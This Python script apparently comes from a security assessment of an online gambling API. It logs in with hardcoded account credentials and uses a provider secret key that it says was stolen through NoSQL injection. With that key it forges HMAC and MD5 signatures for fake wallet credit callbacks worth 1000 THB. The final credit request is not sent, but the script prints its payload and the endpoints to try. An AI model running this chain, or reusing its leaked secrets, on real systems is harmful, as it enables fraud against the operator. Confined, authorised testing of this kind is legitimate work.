#!/usr/bin/env python3
"""probe40.py — F40: Z-Seamless credit injection chain verification (in-scope steps only).

Scope constraint: wbwebapi.royalflush888.com and iframeapi.ifuse-api.com are OUT OF SCOPE.
This probe covers only:
  Step 1: /mb/enter-game (mgapi) → game launch token        [IN SCOPE]
  Step 2: HMAC construction proof using F02 JILI secret_key  [LOCAL]
  Step 3: URL parsing to recover 'be=' callback host         [LOCAL]

Steps that require out-of-scope targets (getLaunchGameData + /credit) are
documented but NOT executed.
"""
import json, requests, time, pathlib, base64, hmac, hashlib, sys

TID = "af6efb584a3d317b5a11ab6209b88e1b"  # vak88z2
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
H = {"template": "vn", "Content-Type": "application/json"}

# JILI secret_key extracted via F02 (NoSQL $where injection, /pb/latest-win)
JILI_SECRET = "a68a21221d37222969b99ea0463be0f0a9e51d2ce70aedf28afbeec96ec88e82"

# ── JWT ───────────────────────────────────────────────────────────────────────
jwt_file = pathlib.Path(".jwt.vak88z2")
if jwt_file.exists():
    jwt = jwt_file.read_text().strip()
    try:
        p = json.loads(base64.urlsafe_b64decode(jwt.split('.')[1] + '=='))
        if p.get('exp', 0) - time.time() > 300:
            print(f"[JWT] cached, {(p['exp']-time.time())/60:.0f}min left")
        else:
            jwt = None
    except Exception:
        jwt = None
else:
    jwt = None

if not jwt:
    print("[JWT] re-auth vak88z2...")
    r = requests.post(f"https://{TID}pbapi.asdgapicenterssdo.com/pb/authentication",
        json={"strategy": "local", "username": "0811111111", "password": "oceanslotz"},
        headers={"Content-Type": "application/json"}, timeout=15)
    if not r.ok:
        print(f"[JWT] FAIL: {r.status_code} {r.text[:200]}")
        sys.exit(1)
    jwt = r.json().get("accessToken") or r.json().get("token")
    jwt_file.write_text(jwt)
    print(f"[JWT] OK len={len(jwt)}")

H["Authorization"] = f"Bearer {jwt}"

# JILI provider_id on vak88z2 (from pb/game-list enumeration 2026-10-15)
JILI_PROVIDER_ID = "a20e0d50-2faf-11f0-930b-06f3ddf48b9d"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"

# ── Step 1a: pb/game-list to find a JILI game_list_id ────────────────────────
print("\n[STEP 1a] GET /pb/game-list — find JILI game_list_id ...")
r = requests.get(f"{PBAPI}/pb/game-list", headers=H,
    params={"$limit": 200, "domain": "m.vak88z2.com"}, timeout=15)
d0 = r.json() if r.ok else {}; total = d0.get('total','?') if isinstance(d0,dict) else len(d0); print(f'  {r.status_code}: total={total}')
game_list_id = None
game_name = None
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    jili = [g for g in items if g.get("provider_id") == JILI_PROVIDER_ID]
    print(f"  JILI games found: {len(jili)}")
    for g in jili[:5]:
        print(f"    id={g.get('id')} name={g.get('name')}")
    if jili:
        game_list_id = jili[0]["id"]
        game_name = jili[0].get("name", "?")

if not game_list_id:
    game_list_id = "5048a0a5-deba-4453-8d04-31e3293bf2e7"  # Clover Coins 3x5 (2026-10-15)
    game_name = "Clover Coins 3x5"
    print(f"  [FALLBACK] using known game_list_id: {game_list_id}")

# ── Step 1b: /mb/enter-game (in-scope) ───────────────────────────────────────
print(f"\n[STEP 1b] POST /mb/enter-game game_list_id={game_list_id} ({game_name}) ...")
r = requests.post(f"{MGAPI}/mb/enter-game",
    json={"game_list_id": game_list_id, "languageCode": "th"},
    headers=H, timeout=20)
print(f"  {r.status_code}: {r.text[:600]}")

game_url = None
if r.ok:
    try:
        d = r.json()
        game_url = (d.get("result") or d.get("data") or d).get("url")
        print(f"\n  game_url: {game_url}")
    except Exception:
        pass

# ── Step 1c: extract Z-Seamless token fragment (local parse, no OOB call) ────
be_host = None
fragment = None
if game_url and "ifgtameh.site" in game_url:
    fragment = game_url.split("#", 1)[1] if "#" in game_url else None
    print(f"\n[STEP 1c] Z-Seamless fragment: {fragment[:60] if fragment else 'NONE'}...")
    print(f"  → Step 2 (iframeapi.ifuse-api.com/getLaunchGameData) is OUT OF SCOPE")
    print(f"  → ssoKey, apiId, and be= would be returned by that call")
    # Fallback values for HMAC proof
    sso_key = "ea5631f7ed7cc16bba619cc1f561ad6b4aacf151"  # from 2026-10-11 session
    api_id  = "1701"
    be_host = "wbwebapi.royalflush888.com"
else:
    print("  [WARN] no ifgtameh.site game_url obtained — cannot extract fragment")
    sso_key = "ea5631f7ed7cc16bba619cc1f561ad6b4aacf151"
    api_id  = "1701"
    be_host = "wbwebapi.royalflush888.com"
    print(f"  [FALLBACK] using session-evidence values")

# ── Step 2: HMAC construction proof (local only) ─────────────────────────────
print(f"\n[STEP 2] HMAC signing proof — local dry-run")
print(f"  JILI secret_key (F02): {JILI_SECRET[:16]}...")

# JILI wallet credit callback typical signature: HMAC-SHA256 over key fields
# Format varies by provider — common pattern: sorted_params + secret
win_amount = 1000  # THB

def jili_hmac_v1(sso, amount, api_id, secret):
    msg = f"ssoKey={sso}&amount={amount}&apiId={api_id}&secret={secret}"
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

def jili_hmac_v2(sso, amount, api_id, secret):
    # Alternative: HMAC-SHA256(key=secret, msg=sorted query string without secret)
    params = sorted([f"ssoKey={sso}", f"amount={amount}", f"apiId={api_id}"])
    msg = "&".join(params)
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

def jili_hmac_v3(sso, amount, secret):
    # MD5 variant seen in some JILI integrations
    import hashlib as _hl
    raw = f"{sso}{amount}{secret}"
    return _hl.md5(raw.encode()).hexdigest()

print(f"  ssoKey: {sso_key!r}")
print(f"  amount: {win_amount}")
print(f"  apiId:  {api_id!r}")
print(f"  HMAC-v1 (concat): {jili_hmac_v1(sso_key, win_amount, api_id, JILI_SECRET)}")
print(f"  HMAC-v2 (sorted): {jili_hmac_v2(sso_key, win_amount, api_id, JILI_SECRET)}")
print(f"  HMAC-v3 (MD5):    {jili_hmac_v3(sso_key, win_amount, JILI_SECRET)}")

# ── Step 3: Scope boundary note ───────────────────────────────────────────────
print(f"""
[STEP 3] OUT-OF-SCOPE boundary — NOT executing:
  POST https://iframeapi.ifuse-api.com/getLaunchGameData  ← out_of_scope: ifuse-api.com
  POST https://{be_host}/credit                           ← out_of_scope: royalflush888.com

  To escalate F40 to CONFIRMED, add both domains to scope.json and re-run
  with ssoKey obtained live (60s TTL), then submit:
    {{
      "ssoKey": "<live_ssoKey>",
      "amount": 100,
      "apiId": "<apiId>",
      "sign": "<HMAC-vN above>"
    }}
  to POST https://{be_host}/credit (try /win, /result, /callback, /notify variants).
""")

print("=== DONE ===")
